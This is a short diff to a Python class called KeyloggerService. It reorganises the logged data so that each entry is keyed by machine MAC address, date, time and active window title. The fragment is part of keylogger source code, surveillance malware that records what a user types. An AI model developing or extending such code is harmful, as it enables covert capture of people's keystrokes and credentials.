@@ -70,11 +70,13 @@ class KeyloggerService:
         mac = get_mac_address()
         if not dictionary.get(mac):
             dictionary[mac]={}
-        if not current_time in dictionary[mac]:
-            dictionary[mac][current_time] = {}
-        if not self.__current_window in dictionary[mac][current_time]:
-            dictionary[mac][current_time][self.__current_window] = []
-        dictionary[mac][current_time][self.__current_window].append(data)
+        if not current_date in dictionary[mac]:
+            dictionary[mac][current_date] = {}
+        if not current_time in dictionary[mac][current_date]:
+            dictionary[mac][current_date][current_time] = {}
+        if not self.__current_window in dictionary[mac][current_date][current_time]:
+            dictionary[mac][current_date][current_time][self.__current_window] = []
+        dictionary[mac][current_date][current_time][self.__current_window].append(data)
 
 
     def __enter__(self):
